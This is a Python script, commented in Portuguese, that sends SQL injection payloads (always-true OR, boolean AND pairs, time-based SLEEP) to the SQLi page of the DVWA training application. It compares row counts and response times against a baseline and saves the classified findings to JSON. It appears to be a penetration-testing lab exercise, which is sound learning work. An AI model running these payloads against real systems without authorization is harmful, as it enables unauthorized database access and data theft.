import time
import json
import os
from bs4 import BeautifulSoup
from dvwa_session import get_logged_session, DVWA_URL

SQLI_URL = f"{DVWA_URL}/vulnerabilities/sqli/"

PAYLOADS = [
    {"id": "baseline",     "value": "1",                    "tipo": "controle"},
    {"id": "erro_or_true", "value": "' OR '1'='1",          "tipo": "baseado_em_erro"},
    {"id": "bool_true",    "value": "1' AND '1'='1",        "tipo": "booleano"},
    {"id": "bool_false",   "value": "1' AND '1'='2",        "tipo": "booleano"},
    {"id": "tempo",        "value": "1' OR SLEEP(3)-- -",   "tipo": "baseado_em_tempo"},
]


def send_payload(session, value):
    start = time.time()
    resp = session.get(SQLI_URL, params={"id": value, "Submit": "Submit"})
    elapsed = time.time() - start
    return resp.text, elapsed


def extract_result_rows(html):
    """O DVWA gera um <pre> por linha retornada pela query — contar isso é a evidência."""
    soup = BeautifulSoup(html, "html.parser")
    return [pre.get_text(strip=True) for pre in soup.find_all("pre")]


def run():
    session = get_logged_session()
    results = {}
    for payload in PAYLOADS:
        html, elapsed = send_payload(session, payload["value"])
        rows = extract_result_rows(html)
        results[payload["id"]] = {
            "payload": payload["value"],
            "tipo": payload["tipo"],
            "linhas_retornadas": len(rows),
            "resultado": rows,
            "tempo_resposta": round(elapsed, 2),
        }
    return results


def classify(results):
    """Decide, por regra própria, se cada técnica indica injeção de verdade."""
    findings = []
    baseline_rows = results["baseline"]["linhas_retornadas"]
    baseline_time = results["baseline"]["tempo_resposta"]

    # 1) baseado em erro/union: a entrada maliciosa trouxe MAIS linhas que o baseline
    if results["erro_or_true"]["linhas_retornadas"] > baseline_rows:
        findings.append({
            "tipo": "sqli_baseado_em_erro",
            "parametro": "id",
            "payload": results["erro_or_true"]["payload"],
            "evidencia": f"Baseline retornou {baseline_rows} linha(s); payload retornou {results['erro_or_true']['linhas_retornadas']} linha(s)",
            "severidade": "alta",
        })

    # 2) booleano: AND '1'='1' deve dar resultado, AND '1'='2' deve dar vazio
    if results["bool_true"]["linhas_retornadas"] > 0 and results["bool_false"]["linhas_retornadas"] == 0:
        findings.append({
            "tipo": "sqli_booleano",
            "parametro": "id",
            "payload": f"{results['bool_true']['payload']} / {results['bool_false']['payload']}",
            "evidencia": "Condição verdadeira retornou dado; condição falsa retornou vazio — resposta muda com a lógica SQL injetada",
            "severidade": "alta",
        })

    # 3) baseado em tempo: resposta demorou muito mais que o baseline
    if results["tempo"]["tempo_resposta"] > baseline_time + 2:
        findings.append({
            "tipo": "sqli_baseado_em_tempo",
            "parametro": "id",
            "payload": results["tempo"]["payload"],
            "evidencia": f"Baseline respondeu em {baseline_time}s; payload com SLEEP(3) respondeu em {results['tempo']['tempo_resposta']}s",
            "severidade": "alta",
        })

    return findings


def save_findings(findings, path="achados/sqli.json"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(findings, f, ensure_ascii=False, indent=2)
    print(f"\n{len(findings)} achado(s) salvo(s) em {path}")


if __name__ == "__main__":
    results = run()
    for key, r in results.items():
        print(f"\n[{key}] payload={r['payload']!r} linhas={r['linhas_retornadas']} tempo={r['tempo_resposta']}s")
        for linha in r["resultado"]:
            print(f"  - {linha[:100]}")

    findings = classify(results)
    save_findings(findings)